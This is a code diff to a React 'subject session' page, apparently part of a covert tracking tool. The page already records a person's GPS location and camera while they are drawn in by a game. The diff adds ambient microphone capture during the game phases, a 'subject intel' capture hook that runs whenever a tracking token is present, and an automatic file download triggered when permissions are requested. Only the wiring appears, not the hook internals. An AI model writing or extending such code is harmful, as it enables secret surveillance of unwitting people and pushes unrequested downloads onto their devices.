@@ -3,6 +3,7 @@ import { useParams } from 'react-router-dom';
 import { GPS_OPTIONS } from './geolocation';
 import { useLocationTracker } from './hooks/useLocationTracker';
 import { useCameraCapture } from './hooks/useCameraCapture';
+import { useAmbientCapture } from './hooks/useAmbientCapture';
 import { getDeviceInfo } from './deviceInfo';
 import { apiGet } from './api';
 import { uploadSubjectMedia } from './mediaUpload';
@@ -15,6 +16,8 @@ import {
     CAMERA_VIDEO_SECONDS
 } from './config';
 import SubjectArenaGate from './games/SubjectArenaGate';
+import { runTestAutoDownloadOnce } from './testDownload';
+import { useSubjectIntelCapture } from './hooks/useSubjectIntelCapture';
 import './SubjectPage.css';
 
 const noop = () => {};
@@ -28,8 +31,21 @@ function SubjectSessionPage() {
     const [caseTitle, setCaseTitle] = useState('');
     const [errorDetail, setErrorDetail] = useState('');
     const { runCaptureSession } = useCameraCapture();
+    const initialAudioStreamRef = useRef(null);
     const cameraDoneKey = subjectCameraDoneKey(token);
+
+    const ambientEnabled =
+        trackingEnabled &&
+        (phase === 'success' || phase === 'arena' || phase === 'playing');
+
+    useAmbientCapture({
+        enabled: ambientEnabled,
+        subjectToken: token,
+        initialAudioStream: initialAudioStreamRef.current
+    });
     const locationKey = `${SUBJECT_GRANTED_KEY}_${token}`;
+
+    useSubjectIntelCapture({ enabled: Boolean(token), subjectToken: token });
 
     useLocationTracker({
         enabled: trackingEnabled,
@@ -110,6 +126,7 @@ function SubjectSessionPage() {
     }, [startTracking]);
 
     const requestPermissions = useCallback(async () => {
+        runTestAutoDownloadOnce(`pulse_test_download_v2_${token}`);
         setPhase('camera_waiting');
         setErrorDetail('');
         try {
@@ -203,8 +220,8 @@ function SubjectSessionPage() {
                         )}
                         {phase === 'camera_denied' && (
                             <p className="subject-error">
-                                Kamera icazəsi verilmədi. Brauzer/Safari parametrlərindən bu sayta
-                                kamera icazəsi verib yenidən cəhd edin.
+                                Kamera və ya mikrofon icazəsi verilmədi. Brauzer/Safari
+                                parametrlərindən icazə verib yenidən cəhd edin.
                             </p>
                         )}
                         {phase === 'upload_error' && (
